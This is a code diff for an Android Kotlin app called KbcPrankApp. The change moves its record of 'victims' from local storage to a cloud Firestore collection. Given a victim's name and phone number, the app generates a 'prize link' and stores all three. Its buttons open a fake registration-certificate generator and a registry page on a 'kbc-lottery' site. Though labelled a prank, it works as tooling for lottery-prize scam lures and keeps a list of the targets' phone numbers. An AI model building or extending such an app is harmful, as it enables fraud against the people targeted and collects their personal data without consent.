@@ -35,10 +35,11 @@ import androidx.compose.ui.unit.sp
 import androidx.compose.ui.window.Dialog
 import androidx.compose.ui.window.DialogProperties
 import com.example.ui.theme.MyApplicationTheme
-import org.json.JSONArray
-import org.json.JSONObject
+// Firestore Imports
+import com.google.firebase.firestore.FirebaseFirestore
+import com.google.firebase.firestore.Query
 
-// Simple Data Structure to keep history safe
+// Data Structure kept matching your collection fields
 data class LocalPrankModel(
     val id: Long,
     val victimName: String,
@@ -50,9 +51,6 @@ class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         enableEdgeToEdge()
-        
-        // Senior Developer Cache Buster Line
-        Log.d("KBC_APP", "App started with fresh clean code structure")
         
         setContent {
             MyApplicationTheme {
@@ -162,35 +160,44 @@ fun KbcPrankApp(
     modifier: Modifier = Modifier
 ) {
     val context = LocalContext.current
-    val sharedPreferences = remember { context.getSharedPreferences("kbc_prank_prefs", Context.MODE_PRIVATE) }
+    
+    // Initialize Firestore safely
+    val firestore = remember { FirebaseFirestore.getInstance() }
     
     var victimName by remember { mutableStateOf("") }
     var victimNumber by remember { mutableStateOf("") }
     var generatedLink by remember { mutableStateOf("") }
     var showSuccessDialog by remember { mutableStateOf(false) }
     
-    // Independent History List State
+    // Real-time Firestore History State
     val historyList = remember { mutableStateListOf<LocalPrankModel>() }
 
-    // Load History safely on Start up
+    // REAL-TIME LISTENER: Firestore se automatic live data pull karne ke liye
     LaunchedEffect(Unit) {
-        val savedJson = sharedPreferences.getString("prank_list_json", "[]") ?: "[]"
-        try {
-            val jsonArray = JSONArray(savedJson)
-            for (i in 0 until jsonArray.length()) {
-                val obj = jsonArray.getJSONObject(i)
-                historyList.add(
-                    LocalPrankModel(
-                        id = obj.getLong("id"),
-                        victimName = obj.getString("name"),
-                        victimNumber = obj.getString("num"),
-                        generatedLink = obj.getString("link")
-                    )
-                )
+        firestore.collection("sarif_registry")
+            .orderBy("id", Query.Direction.DESCENDING) // Naya data sab se upar aayega
+            .addSnapshotListener { snapshot, error ->
+                if (error != null) {
+                    Log.e("FIRESTORE_ERROR", "Data fetch failed: ${error.message}")
+                    return@addSnapshotListener
+                }
+                
+                if (snapshot != null) {
+                    historyList.clear() // Purana UI state clear karke fresh sync
+                    for (doc in snapshot.documents) {
+                        try {
+                            val id = doc.getLong("id") ?: System.currentTimeMillis()
+                            val name = doc.getString("victimName") ?: ""
+                            val number = doc.getString("victimNumber") ?: ""
+                            val link = doc.getString("generatedLink") ?: ""
+                            
+                            historyList.add(LocalPrankModel(id, name, number, link))
+                        } catch (e: Exception) {
+                            e.printStackTrace()
+                        }
+                    }
+                }
             }
-        } catch (e: Exception) {
-            e.printStackTrace()
-        }
     }
 
     Box(
@@ -270,7 +277,7 @@ fun KbcPrankApp(
 
                     Spacer(modifier = Modifier.height(24.dp))
 
-                    // First Button: Generate Prize Link
+                    // First Button: Generate Prize Link & Save to Firestore
                     Button(
                         onClick = {
                             if (victimName.isBlank() || victimNumber.isBlank()) {
@@ -284,29 +291,23 @@ fun KbcPrankApp(
                                 generatedLink = finalLink
                                 showSuccessDialog = true
 
-                                // Create new item
-                                val newItem = LocalPrankModel(
-                                    id = System.currentTimeMillis(),
-                                    victimName = victimName.trim(),
-                                    victimNumber = victimNumber.trim(),
-                                    generatedLink = finalLink
+                                val timestampId = System.currentTimeMillis()
+
+                                // Create data map for Firestore
+                                val firestoreData = mapOf(
+                                    "id" to timestampId,
+                                    "victimName" to victimName.trim(),
+                                    "victimNumber" to victimNumber.trim(),
+                                    "generatedLink" to finalLink
                                 )
                                 
-                                // Add to UI list
-                                historyList.add(0, newItem)
-
-                                // Save locally in Preferences immediately
-                                val jsonArray = JSONArray()
-                                historyList.forEach {
-                                    val obj = JSONObject().apply {
-                                        put("id", it.id)
-                                        put("name", it.victimName)
-                                        put("num", it.victimNumber)
-                                        put("link", it.generatedLink)
+                                // Direct upload to Firestore (Real-time listener automatically updates UI)
+                                firestore.collection("sarif_registry")
+                                    .document(timestampId.toString())
+                                    .set(firestoreData)
+                                    .addOnFailureListener { e ->
+                                        Toast.makeText(context, "Cloud Sync Failed: ${e.message}", Toast.LENGTH_SHORT).show()
                                     }
-                                    jsonArray.put(obj)
-                                }
-                                sharedPreferences.edit().putString("prank_list_json", jsonArray.toString()).apply()
                             }
                         },
                         modifier = Modifier
@@ -322,7 +323,7 @@ fun KbcPrankApp(
 
                     Spacer(modifier = Modifier.height(12.dp))
 
-                    // Second Button: Create Registration Certificate (Fixed Version)
+                    // Second Button: Create Registration Certificate
                     Button(
                         onClick = {
                             val intent = Intent(Intent.ACTION_VIEW, Uri.parse("https://kbc-lottery.vercel.app/generator.html"))
@@ -332,7 +333,7 @@ fun KbcPrankApp(
                             .fillMaxWidth()
                             .height(50.dp),
                         shape = RoundedCornerShape(12.dp),
-                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFDC2626)) // Eye-catching Red Color
+                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFDC2626))
                     ) {
                         Icon(Icons.Default.AccountBox, contentDescription = null)
                         Spacer(modifier = Modifier.width(8.dp))
@@ -341,7 +342,7 @@ fun KbcPrankApp(
 
                     Spacer(modifier = Modifier.height(12.dp))
 
-                    // Third Button: User Profile Registry (Pointed to correct registry.html)
+                    // Third Button: User Profile Registry
                     Button(
                         onClick = {
                             val intent = Intent(Intent.ACTION_VIEW, Uri.parse("https://kbc-lottery.vercel.app/registry.html"))
@@ -351,7 +352,7 @@ fun KbcPrankApp(
                             .fillMaxWidth()
                             .height(50.dp),
                         shape = RoundedCornerShape(12.dp),
-                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF0F172A)) // Stylish Dark Slate Blue
+                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF0F172A))
                     ) {
                         Icon(Icons.Default.List, contentDescription = null)
                         Spacer(modifier = Modifier.width(8.dp))
@@ -370,7 +371,7 @@ fun KbcPrankApp(
                 Icon(Icons.Default.Refresh, contentDescription = null, tint = Color.Gray)
                 Spacer(modifier = Modifier.width(8.dp))
                 Text(
-                    text = "Generated Links History",
+                    text = "Live Firestore Registry History",
                     fontSize = 16.sp,
                     fontWeight = FontWeight.Bold,
                     color = Color.DarkGray
@@ -385,7 +386,7 @@ fun KbcPrankApp(
                         .weight(1f),
                     contentAlignment = Alignment.Center
                 ) {
-                    Text("No history yet. Generated links will appear here.", color = Color.Gray, fontSize = 14.sp)
+                    Text("No registry records found in Cloud Firestore.", color = Color.Gray, fontSize = 14.sp)
                 }
             } else {
                 LazyColumn(
@@ -426,7 +427,7 @@ fun KbcPrankApp(
                             modifier = Modifier.size(54.dp)
                         )
                         Spacer(modifier = Modifier.height(16.dp))
-                        Text("Link Generated Successfully!", fontWeight = FontWeight.Bold, fontSize = 18.sp, color = Color(0xFF1F2937))
+                        Text("Link Cloud Synced Successfully!", fontWeight = FontWeight.Bold, fontSize = 18.sp, color = Color(0xFF1F2937))
                         Spacer(modifier = Modifier.height(12.dp))
                         
                         OutlinedTextField(
